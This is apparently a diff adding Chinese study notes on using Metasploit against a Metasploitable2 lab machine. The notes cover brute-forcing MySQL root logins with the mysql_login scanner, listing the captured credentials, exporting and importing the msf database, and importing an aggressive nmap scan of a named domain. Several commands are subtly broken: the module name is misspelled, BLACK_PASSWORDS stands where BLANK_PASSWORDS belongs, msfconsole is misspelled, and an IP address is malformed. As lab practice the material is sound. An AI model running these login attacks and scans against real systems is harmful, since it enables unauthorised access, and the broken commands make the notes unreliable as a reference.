@@ -1,0 +1,62 @@
+靶机
+metasploitable2-linux 桥接ip192.16.8.1.180
+跟攻击机同一内网
+
+
+msf6 > search mysql_login
+msf6 > use auxiliary/scanner/mysql/mysl_login
+msf6 auxiliary（scanner/mysql/mysl_login）> show options
+msf6 auxiliary（scanner/mysql/mysl_login）> set RHOSTS 192.168.1.180
+msf6 auxiliary（scanner/mysql/mysl_login）> set USERNAME root
+msf6 auxiliary（scanner/mysql/mysl_login）> set BLACK_PASSWORDS true
+msf6 auxiliary（scanner/mysql/mysl_login）> exploit
+msf6 auxiliary（scanner/mysql/mysl_login）> creds
+列出数据库所有账号相信内容
+
+到处结果到另一个机器
+db_connect 连接到现有数据库
+db_disconnect 断开
+db_export 到处到文件
+db_import 导入扫描结果
+
+空秘密信息到处
+msf6 auxiliary（scanner/mysql/mysl_login）> db_export -f xml /root/bak.xml
+仅支持xml和pwdump
+
+
+另一台机器导入
+重置数据库
+msfdb reinit
+msfconsolse
+msf6 > hosts
+所有渗透结果目标主机
+msf6 > db_import /root/bak.xml
+msf6 > hosts
+msf6 > hosts -c address,names
+选择显示列
+
+导入nmap结果
+nmap -A xuegod.cn -oX /root/nmap.xml
+输出xml格式
+msf6 > db_import /root/nmap.xml
+msf6 > hosts
+msf6 > services
+数据库主机开放哪些服务端口
+
+msf6 > services -R 192.168.1.180
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
